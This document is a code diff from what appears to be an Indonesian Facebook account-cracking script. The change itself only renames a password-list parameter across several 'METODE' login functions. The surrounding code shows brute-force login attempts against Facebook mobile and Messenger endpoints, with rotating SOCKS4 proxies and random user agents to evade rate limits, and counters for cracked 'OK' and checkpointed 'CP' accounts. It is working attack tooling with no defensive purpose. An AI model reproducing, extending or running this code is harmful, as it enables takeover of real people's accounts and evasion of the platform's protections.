@@ -789,19 +789,19 @@ def passwordlist():
 				elif 'asyinc' in method:
 				    pemuda_tersakiti.submit(crackasyinc,idf,pwx,'m.alpha.facebook.com')
 				elif 'rr071' in method:
-				    pemuda_tersakiti.submit(rr071,idf,pwv,'m.alpha.facebook.com')
+				    pemuda_tersakiti.submit(rr071,idf,pwx,'m.alpha.facebook.com')
 				elif 'rr072' in method:
-				    pemuda_tersakiti.submit(rr072,idf,pwv,'m.alpha.facebook.com')
+				    pemuda_tersakiti.submit(rr072,idf,pwx,'m.alpha.facebook.com')
 				elif 'rr073' in method:
-				    pemuda_tersakiti.submit(rr073,idf,pwv,'m.alpha.facebook.com')
+				    pemuda_tersakiti.submit(rr073,idf,pwx,'m.alpha.facebook.com')
 				elif 'rr074' in method:
-				    pemuda_tersakiti.submit(rr074,uid,pwv,'m.alpha.facebook.com')
+				    pemuda_tersakiti.submit(rr074,uid,pwx,'m.alpha.facebook.com')
 				elif 'rr075' in method:
-				    pemuda_tersakiti.submit(rr075,uid,pwv,'m.alpha.facebook.com')
+				    pemuda_tersakiti.submit(rr075,uid,pwx,'m.alpha.facebook.com')
 				elif 'rr076' in method:
-				    pemuda_tersakiti.submit(rr076,uid,pwv,'m.alpha.facebook.com')
+				    pemuda_tersakiti.submit(rr076,uid,pwx,'m.alpha.facebook.com')
 				elif 'rr077' in method:
-				    pemuda_tersakiti.submit(rr077,uid,pwv,'m.alpha.facebook.com')
+				    pemuda_tersakiti.submit(rr077,uid,pwx,'m.alpha.facebook.com')
 				else:
 				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
 				    
@@ -1065,7 +1065,7 @@ def crackasyinc(idf,pwx):
     except requests.exceptions.ConnectionError:time.sleep(31)
   loop+=1
 #-------------------[ METODE-B-API ]-----------------#
-def rr071(idf,pwv):
+def rr071(idf,pwx):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ses = requests.Session()
@@ -1073,7 +1073,7 @@ def rr071(idf,pwv):
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ses = requests.Session()
-	for pw in pwv:
+	for pw in pwx:
 		try:
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
@@ -1124,7 +1124,7 @@ def rr071(idf,pwv):
 	loop+=1
 
 #------------------[ METODE-MBASIC-2 ]-------------------#
-def rr072(idf,pwv):
+def rr072(idf,pwx):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ses = requests.Session()
@@ -1132,7 +1132,7 @@ def rr072(idf,pwv):
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ses = requests.Session()
-	for pw in pwv:
+	for pw in pwx:
 		try:
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
@@ -1168,13 +1168,13 @@ def rr072(idf,pwv):
 			time.sleep(31)
 	loop+=1
 #---------------------[ METODE-TOUCH-3 ]---------------------#
-def rr073(idf,pwv):
+def rr073(idf,pwx):
 	global loop,ok,cp
 	ua = random.choice(ugen)
 	sys.stdout.write(f"\r[{bo}RR07 v3{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}{x}] [{U}CP-{x}:{K}{cp}{x}] [{U}Crack-:{bo}{idf}{x}]"),
 	sys.stdout.flush()
 	ses = requests.Session()
-	for pw in pwv:
+	for pw in pwx:
 		try:
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
@@ -1224,12 +1224,12 @@ def rr073(idf,pwv):
 			time.sleep(31)
 	loop+=1
 ###-----[ METODE VALIDATE ]-----###
-def rr074(uid,pwv):
+def rr074(uid,pwx):
 	global loop,ok,cp
 	sys.stdout.write(f"\r[{bo}RR07 v4{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}{x}] [{U}CP-{x}:{K}{cp}{x}] [{U}Crack-:{bo}{idf}{x}]"),
 	sys.stdout.flush()
 	ses = requests.Session()
-	for pw in pwv:
+	for pw in pwx:
 		try:
 			if 'uadia' in uadarimu: ua = uadia[0]
 			else:ua = ugen()
@@ -1259,12 +1259,12 @@ def rr074(uid,pwv):
 			time.sleep(15)
 	loop+=1
 ###-----[ METODE ASYNC ]-----###
-def rr075(uid,pwv):
+def rr075(uid,pwx):
 	global loop,ok,cp
 	sys.stdout.write(f"\r[{bo}RR07 v5{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}{x}] [{U}CP-{x}:{K}{cp}{x}] [{U}Crack-:{bo}{idf}{x}]"),
 	sys.stdout.flush()
 	ses = requests.Session()
-	for pw in pwv:
+	for pw in pwx:
 		try:
 			if 'uadia' in uadarimu: ua = uadia[0]
 			else:ua = ugen()
@@ -1296,12 +1296,12 @@ def rr075(uid,pwv):
 			time.sleep(15)
 	loop+=1
 ###-----[ METODE API ]-----###
-def rr076(uid,pwv):
+def rr076(uid,pwx):
 	global loop,ok,cp,a2f
 	sys.stdout.write(f"\r[{bo}RR07 v6{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}{x}] [{U}CP-{x}:{K}{cp}{x}] [{U}Crack-:{bo}{idf}{x}]"),
 	sys.stdout.flush()
 	ses = requests.Session()
-	for pw in pwv:
+	for pw in pwx:
 		try:
 			if 'uadia' in uadarimu: ua = uadia[0]
 			else:ua = api()
@@ -1339,7 +1339,7 @@ def rr076(uid,pwv):
 			time.sleep(15)
 	loop+=1
 ###-----[ METODE MESSENGER ]-----###
-def rr077(uid,pwv):
+def rr077(uid,pwx):
 	global loop,ok,cp
 	sys.stdout.write(f"\r[{bo}RR07 v7{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}{x}] [{U}CP-{x}:{K}{cp}{x}] [{U}Crack-:{bo}{idf}{x}]"),
 	sys.stdout.flush()
@@ -1388,7 +1388,7 @@ def rr077(uid,pwv):
 			headers.update({"Cookie":f"wd=980x1715; dpr=2; _js_datr={datr}"})
 			break
 		except:pass
-	for pw in pwv:
+	for pw in pwx:
 		try:
 			data.update({"pass":"".join(pw)})
 			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, allow_redirects=False)
@@ -1414,7 +1414,7 @@ def rr077(uid,pwv):
 		except:pass
 	loop+=1
 #--------------------[ METODE-MOBILE ]-----------------#
-def rr078(uid,pwv):
+def rr078(uid,pwx):
 	global loop,ok,cp
 	bi = random.choice(['\33[m'])
 	pers = loop*100/len(id2)
@@ -1428,7 +1428,7 @@ def rr078(uid,pwv):
 	post = posturlm()
 	ua = random.choice(ugen)
 	ses = requests.Session()
-	for pw in pwv:
+	for pw in pwx:
 		try:
 			link = ses.get(get)
 			data = {
